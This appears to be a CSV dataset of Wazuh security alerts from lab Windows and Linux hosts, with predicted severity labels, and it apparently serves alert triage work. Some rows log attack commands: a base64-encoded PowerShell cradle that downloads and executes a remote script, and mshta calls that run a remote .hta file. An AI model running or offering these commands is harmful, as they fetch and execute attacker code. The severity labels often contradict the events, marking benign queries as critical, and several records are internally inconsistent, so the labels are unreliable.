@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,data.win.eventdata.commandLine,raw,severity_pred
2025-12-28T08:07:22.300Z,Endpoint1-Win,3,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 1, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T08:07:22.300Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T08:07:22.300Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12830"", ""utcTime"": ""2025-12-28 08:07:22.300""}}}}",critical
2025-12-30T22:46:14.512Z,Endpoint1-Win,3,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 59, ""mail"": false, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T22:46:14.512Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T22:46:14.512Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""11244"", ""utcTime"": ""2025-12-30 22:46:14.512""}}}}",low
2025-12-30T13:17:18.654Z,Endpoint1-Win,3,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 10, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T13:17:18.654Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T13:17:18.654Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3646"", ""utcTime"": ""2025-12-30 13:17:18.654""}}}}",low
2025-12-29T19:36:49.331Z,Endpoint3-Win,1,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 60, ""mail"": false, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T19:36:49.331Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T19:36:49.331Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""6038"", ""utcTime"": ""2025-12-29 19:36:49.331""}}}}",medium
2025-12-28T04:13:04.246Z,Endpoint2-Win,2,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 6, ""mail"": true, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T04:13:04.246Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T04:13:04.246Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8962"", ""utcTime"": ""2025-12-28 04:13:04.246""}}}}",critical
2025-12-30T23:12:52.778Z,Endpoint3-Win,1,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 9, ""mail"": true, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T23:12:52.778Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T23:12:52.778Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8787"", ""utcTime"": ""2025-12-30 23:12:52.778""}}}}",critical
2025-12-28T19:18:03.540Z,Endpoint2-Win,2,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 14, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T19:18:03.540Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T19:18:03.540Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9835"", ""utcTime"": ""2025-12-28 19:18:03.540""}}}}",critical
2025-12-30T03:54:55.319Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 42, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T03:54:55.319Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T03:54:55.319Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8177"", ""utcTime"": ""2025-12-30 03:54:55.319""}}}}",low
2025-12-28T08:48:40.253Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 2, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T08:48:40.253Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T08:48:40.253Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T08:48:40.253+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
2025-12-29T18:50:56.225Z,Endpoint2-Win,2,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA=","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 5, ""mail"": true, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T18:50:56.225Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T18:50:56.225Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA="", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1514"", ""utcTime"": ""2025-12-29 18:50:56.225""}}}}",critical
2025-12-28T05:09:34.526Z,Endpoint1-Win,3,92090,Suspicious LOLBin mshta used to execute remote script,12,T1218.005,EventChannel,"\""C:\Windows\System32\mshta.exe\"" http://192.168.100.20/a.hta","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 14, ""mail"": true, ""level"": 12, ""description"": ""Suspicious LOLBin mshta used to execute remote script"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.005""]}, ""id"": ""92090""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T05:09:34.526Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T05:09:34.526Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\mshta.exe\\\"" http://192.168.100.20/a.hta"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3167"", ""utcTime"": ""2025-12-28 05:09:34.526""}}}}",critical
2025-12-28T17:41:40.803Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 13, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T17:41:40.803Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T17:41:40.803Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T17:41:40.803+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-29T23:59:08.441Z,Endpoint3-Win,1,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 30, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T23:59:08.441Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T23:59:08.441Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12945"", ""utcTime"": ""2025-12-29 23:59:08.441""}}}}",critical
2025-12-30T01:01:58.669Z,Endpoint3-Win,1,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 4, ""mail"": false, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T01:01:58.669Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T01:01:58.669Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12931"", ""utcTime"": ""2025-12-30 01:01:58.669""}}}}",medium
2025-12-30T10:17:50.882Z,Endpoint1-Win,3,92213,Executable file dropped in folder commonly used by malware,15,T1105,EventChannel,,"{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 4, ""mail"": true, ""level"": 15, ""description"": ""Executable file dropped in folder commonly used by malware"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1105""]}, ""id"": ""92213""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T10:17:50.882Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T10:17:50.882Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": """", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9856"", ""utcTime"": ""2025-12-30 10:17:50.882"", ""targetFilename"": ""C:\\Users\\ayoub\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m82i1lr3.ps1""}}}}",critical
2025-12-30T22:33:36.095Z,Endpoint3-Win,1,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 11, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T22:33:36.095Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T22:33:36.095Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8956"", ""utcTime"": ""2025-12-30 22:33:36.095""}}}}",medium
2025-12-28T15:33:52.885Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 11, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T15:33:52.885Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T15:33:52.885Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T15:33:52.885+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T23:44:52.399Z,Endpoint3-Win,1,92090,Suspicious LOLBin mshta used to execute remote script,12,T1218.005,EventChannel,"\""C:\Windows\System32\mshta.exe\"" http://192.168.100.20/a.hta","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 19, ""mail"": false, ""level"": 12, ""description"": ""Suspicious LOLBin mshta used to execute remote script"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.005""]}, ""id"": ""92090""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T23:44:52.399Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T23:44:52.399Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\mshta.exe\\\"" http://192.168.100.20/a.hta"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12412"", ""utcTime"": ""2025-12-30 23:44:52.399""}}}}",medium
2025-12-28T11:16:19.194Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 38, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T11:16:19.194Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T11:16:19.194Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T11:16:19.194+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
2025-12-30T06:27:57.321Z,Endpoint3-Win,1,92090,Suspicious LOLBin mshta used to execute remote script,12,T1218.005,EventChannel,"\""C:\Windows\System32\mshta.exe\"" http://192.168.100.20/a.hta","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 33, ""mail"": true, ""level"": 12, ""description"": ""Suspicious LOLBin mshta used to execute remote script"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.005""]}, ""id"": ""92090""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T06:27:57.321Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T06:27:57.321Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\mshta.exe\\\"" http://192.168.100.20/a.hta"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9701"", ""utcTime"": ""2025-12-30 06:27:57.321""}}}}",critical
2025-12-28T04:08:30.983Z,Endpoint2-Win,2,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 5, ""mail"": true, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T04:08:30.983Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T04:08:30.983Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2113"", ""utcTime"": ""2025-12-28 04:08:30.983""}}}}",critical
2025-12-29T05:24:07.122Z,Endpoint2-Win,2,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 16, ""mail"": true, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T05:24:07.122Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T05:24:07.122Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10740"", ""utcTime"": ""2025-12-29 05:24:07.122""}}}}",critical
2025-12-29T21:06:07.083Z,Endpoint3-Win,1,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 37, ""mail"": true, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T21:06:07.083Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T21:06:07.083Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""6183"", ""utcTime"": ""2025-12-29 21:06:07.083""}}}}",critical
2025-12-28T14:52:25.685Z,Endpoint1-Win,3,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 17, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T14:52:25.685Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T14:52:25.685Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3144"", ""utcTime"": ""2025-12-28 14:52:25.685""}}}}",low
